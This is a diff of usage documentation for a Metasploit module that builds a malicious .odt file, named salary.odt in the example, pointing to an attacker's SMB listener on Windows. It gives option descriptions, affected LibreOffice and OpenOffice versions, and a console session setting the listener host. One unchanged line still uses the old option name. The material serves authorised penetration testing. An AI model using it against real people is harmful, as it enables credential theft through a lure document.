@@ -21,20 +21,21 @@ https://www.openoffice.org/download/
 
 ## Options
 
-CREATOR - This option allows you to customise the document author for the new document.
+**CREATOR**
+This option allows you to customise the document author for the new document.
 This can be changed using set CREATOR New_User
 
-FILENAME - This option allows you to customise the generated filename.
+**FILENAME**
+This option allows you to customise the generated filename.
 This can be changed using set FILENAME salary.odt
 
-LISTENER - This option allows you to set the IP address of the SMB Listener that the .odt document points to
+**LHOST**
+This option allows you to set the IP address of the SMB Listener that the .odt document points to
 This can be changed using set LISTENER 192.168.1.25
 
 ## Scenarios
 
-### Version of software and OS as applicable
-
-  LibreOffice 6.03 /Apache OpenOffice 4.1.5 and any version of Microsoft Windows.
+LibreOffice 6.03 /Apache OpenOffice 4.1.5 and any version of Microsoft Windows.
 
   ```
   Console output
@@ -44,8 +45,8 @@ This can be changed using set LISTENER 192.168.1.25
   msf > use auxiliary/odt/badodt
   msf auxiliary(odt/badodt) > set FILENAME salary.odt
   FILENAME => salary.odt
-  msf auxiliary(odt/badodt) > set LISTENER 192.168.1.25
-  LISTENER => 192.168.1.25
+  msf auxiliary(odt/badodt) > set LHOST 192.168.1.25
+  LHOST => 192.168.1.25
   msf auxiliary(odt/badodt) > set CREATOR A_USER
   CREATOR => A_USER
   msf auxiliary(odt/badodt) > exploit
